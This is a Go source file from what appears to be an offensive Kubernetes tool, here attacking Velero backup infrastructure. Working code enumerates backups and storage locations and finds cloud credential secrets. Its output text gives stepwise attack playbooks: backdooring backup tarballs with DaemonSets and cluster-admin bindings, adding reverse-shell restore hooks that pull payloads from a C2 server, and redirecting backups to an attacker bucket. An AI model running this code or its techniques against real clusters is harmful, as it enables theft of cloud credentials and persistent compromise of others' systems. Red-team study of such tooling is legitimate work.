package cloudevasion

import (
	"context"
	"fmt"
	"strings"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

var veleroBackupGVR = schema.GroupVersionResource{
	Group: "velero.io", Version: "v1", Resource: "backups",
}

var veleroScheduleGVR = schema.GroupVersionResource{
	Group: "velero.io", Version: "v1", Resource: "schedules",
}

var veleroBackupStorageLocationGVR = schema.GroupVersionResource{
	Group: "velero.io", Version: "v1", Resource: "backupstoragelocations",
}

func detectVelero(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
	namespaces := []string{"velero", "velero-system"}
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "component=velero",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "velero",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("%d velero pods", len(pods.Items)),
			}}
		}

		pods, err = client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "deploy=velero",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "velero",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("velero deployment in %s", ns),
			}}
		}
	}

	return nil
}

// ExploitVelero executes the specified Velero backup/restore exploitation technique.
func ExploitVelero(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
	switch technique {
	case "enumerate":
		return veleroEnumerate(ctx, client, dynClient)
	case "backup_inject":
		return veleroBackupInject(ctx, client, dynClient)
	case "restore_hooks":
		return veleroRestoreHooks(ctx, dynClient)
	case "secret_steal":
		return veleroSecretSteal(ctx, client, dynClient)
	default:
		return veleroEnumerate(ctx, client, dynClient)
	}
}

func veleroEnumerate(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Velero Backup Infrastructure Enumeration:\n\n")

	found := false

	backups, err := dynClient.Resource(veleroBackupGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil && len(backups.Items) > 0 {
		found = true
		fmt.Fprintf(&sb, "  Backups (%d):\n", len(backups.Items))
		for _, backup := range backups.Items {
			status, _ := backup.Object["status"].(map[string]any)
			phase, _ := status["phase"].(string)
			fmt.Fprintf(&sb, "    %s/%s phase=%s\n", backup.GetNamespace(), backup.GetName(), phase)
		}
		sb.WriteString("\n")
	}

	schedules, err := dynClient.Resource(veleroScheduleGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil && len(schedules.Items) > 0 {
		found = true
		fmt.Fprintf(&sb, "  Schedules (%d):\n", len(schedules.Items))
		for _, sched := range schedules.Items {
			spec, _ := sched.Object["spec"].(map[string]any)
			schedule, _ := spec["schedule"].(string)
			fmt.Fprintf(&sb, "    %s/%s cron=%s\n", sched.GetNamespace(), sched.GetName(), schedule)
		}
		sb.WriteString("\n")
	}

	bsls, err := dynClient.Resource(veleroBackupStorageLocationGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil && len(bsls.Items) > 0 {
		found = true
		fmt.Fprintf(&sb, "  BackupStorageLocations (%d):\n", len(bsls.Items))
		for _, bsl := range bsls.Items {
			spec, _ := bsl.Object["spec"].(map[string]any)
			provider, _ := spec["provider"].(string)
			objectStorage, _ := spec["objectStorage"].(map[string]any)
			bucket, _ := objectStorage["bucket"].(string)
			fmt.Fprintf(&sb, "    %s: provider=%s bucket=%s\n", bsl.GetName(), provider, bucket)
		}
		sb.WriteString("\n")
	}

	namespaces := []string{"velero", "velero-system"}
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{})
		if err == nil {
			for _, pod := range pods.Items {
				fmt.Fprintf(&sb, "  Pod: %s/%s phase=%s\n", ns, pod.Name, pod.Status.Phase)
			}
		}
	}

	if !found {
		sb.WriteString("  No Velero resources detected\n")
	}

	return &EvasionResult{
		Technique: "enumerate",
		Success:   found,
		Output:    sb.String(),
	}, nil
}

func veleroBackupInject(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Velero Backup Injection:\n\n")

	sb.WriteString("  Velero backups capture cluster state to object storage.\n")
	sb.WriteString("  Injecting a backdoor into backup ensures persistence across restores.\n\n")

	bsls, err := dynClient.Resource(veleroBackupStorageLocationGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list BackupStorageLocations: %v\n", err)
		return &EvasionResult{Technique: "backup_inject", Success: false, Output: sb.String()}, nil
	}

	for _, bsl := range bsls.Items {
		spec, _ := bsl.Object["spec"].(map[string]any)
		provider, _ := spec["provider"].(string)
		credential, _ := spec["credential"].(map[string]any)
		objectStorage, _ := spec["objectStorage"].(map[string]any)
		bucket, _ := objectStorage["bucket"].(string)
		prefix, _ := objectStorage["prefix"].(string)

		fmt.Fprintf(&sb, "  BSL: %s\n", bsl.GetName())
		fmt.Fprintf(&sb, "    Provider: %s\n", provider)
		fmt.Fprintf(&sb, "    Bucket: %s/%s\n", bucket, prefix)
		if secretName, ok := credential["name"].(string); ok {
			fmt.Fprintf(&sb, "    Credential secret: %s\n", secretName)
		}
	}

	secrets, err := client.CoreV1().Secrets("velero").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, s := range secrets.Items {
			if strings.Contains(s.Name, "cloud") || strings.Contains(s.Name, "credentials") || strings.Contains(s.Name, "bsl") {
				fmt.Fprintf(&sb, "  Storage credential: %s/%s\n", s.Namespace, s.Name)
			}
		}
	}

	sb.WriteString("\n  Backup injection techniques:\n")
	sb.WriteString("    1. Access backup storage (S3/GCS/Azure) with stolen credentials\n")
	sb.WriteString("    2. Modify backup tarball to include backdoor resources\n")
	sb.WriteString("    3. Inject malicious DaemonSet/CronJob into backup manifests\n")
	sb.WriteString("    4. Modify ServiceAccount tokens in backup for persistence\n")
	sb.WriteString("    5. Add ClusterRoleBinding granting attacker SA cluster-admin\n")
	sb.WriteString("    6. Backdoor persists through any restore operation\n")

	return &EvasionResult{
		Technique: "backup_inject",
		Success:   len(bsls.Items) > 0,
		Output:    sb.String(),
	}, nil
}

func veleroRestoreHooks(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Velero Restore Hooks Exploitation:\n\n")

	sb.WriteString("  Restore hooks execute commands inside containers during restore.\n")
	sb.WriteString("  Injecting hooks into backup achieves code execution on restore.\n\n")

	backups, err := dynClient.Resource(veleroBackupGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list backups: %v\n", err)
		return &EvasionResult{Technique: "restore_hooks", Success: false, Output: sb.String()}, nil
	}

	hookBackups := 0
	for _, backup := range backups.Items {
		spec, _ := backup.Object["spec"].(map[string]any)
		if hooks, ok := spec["hooks"].(map[string]any); ok {
			if resources, ok := hooks["resources"].([]any); ok && len(resources) > 0 {
				hookBackups++
				fmt.Fprintf(&sb, "  Backup %s has %d hook resources:\n", backup.GetName(), len(resources))
				for _, res := range resources {
					if resMap, ok := res.(map[string]any); ok {
						name, _ := resMap["name"].(string)
						fmt.Fprintf(&sb, "    Hook: %s\n", name)
					}
				}
			}
		}
	}

	schedules, err := dynClient.Resource(veleroScheduleGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, sched := range schedules.Items {
			spec, _ := sched.Object["spec"].(map[string]any)
			if template, ok := spec["template"].(map[string]any); ok {
				if hooks, ok := template["hooks"].(map[string]any); ok {
					fmt.Fprintf(&sb, "  Schedule %s has hooks: %v\n", sched.GetName(), hooks)
				}
			}
		}
	}

	sb.WriteString("\n  Restore hook attack vectors:\n")
	sb.WriteString("    1. Add InitContainer restore hook with reverse shell command\n")
	sb.WriteString("    2. Hook executes as the container's user (often root)\n")
	sb.WriteString("    3. exec hooks run inside existing containers post-restore\n")
	sb.WriteString("    4. init hooks run before the container starts\n")
	sb.WriteString("    5. Modify backup to add hooks to high-privilege pods\n")
	sb.WriteString("    6. Hooks can download and execute payloads from external C2\n")

	return &EvasionResult{
		Technique: "restore_hooks",
		Success:   hookBackups > 0 || len(backups.Items) > 0,
		Output:    sb.String(),
	}, nil
}

func veleroSecretSteal(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Velero Storage Credential Theft:\n\n")

	bsls, err := dynClient.Resource(veleroBackupStorageLocationGVR).Namespace("").List(ctx, metav1.ListOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  Cannot list BSLs: %v\n", err)
		return &EvasionResult{Technique: "secret_steal", Success: false, Output: sb.String()}, nil
	}

	credSecrets := make(map[string]string)
	for _, bsl := range bsls.Items {
		spec, _ := bsl.Object["spec"].(map[string]any)
		provider, _ := spec["provider"].(string)

		if credential, ok := spec["credential"].(map[string]any); ok {
			secretName, _ := credential["name"].(string)
			secretKey, _ := credential["key"].(string)
			if secretName != "" {
				credSecrets[secretName] = secretKey
				fmt.Fprintf(&sb, "  BSL %s (%s): secret=%s key=%s\n", bsl.GetName(), provider, secretName, secretKey)
			}
		}
	}

	namespaces := []string{"velero", "velero-system"}
	found := 0
	for _, ns := range namespaces {
		secrets, err := client.CoreV1().Secrets(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}
		for _, s := range secrets.Items {
			if strings.Contains(s.Name, "cloud") || strings.Contains(s.Name, "credential") || strings.Contains(s.Name, "bsl") || credSecrets[s.Name] != "" {
				found++
				fmt.Fprintf(&sb, "  [CRED] %s/%s type=%s keys=%v\n", ns, s.Name, s.Type, secretKeys(s.Data))
			}
		}
	}

	sb.WriteString("\n  Credential exploitation:\n")
	sb.WriteString("    1. Velero credentials typically have FULL access to backup bucket\n")
	sb.WriteString("    2. AWS: access key/secret key in cloud-credentials secret\n")
	sb.WriteString("    3. GCP: service account JSON key with storage admin\n")
	sb.WriteString("    4. Azure: storage account key or service principal credentials\n")
	sb.WriteString("    5. Use credentials to access ALL backups (contains cluster secrets)\n")
	sb.WriteString("    6. Backups contain etcd-like data: secrets, configmaps, RBAC\n")
	sb.WriteString("    7. Modify backup storage to redirect future backups to attacker bucket\n")

	return &EvasionResult{
		Technique: "secret_steal",
		Success:   found > 0,
		Output:    sb.String(),
	}, nil
}

func secretKeys(data map[string][]byte) []string {
	keys := make([]string, 0, len(data))
	for k := range data {
		keys = append(keys, k)
	}
	return keys
}
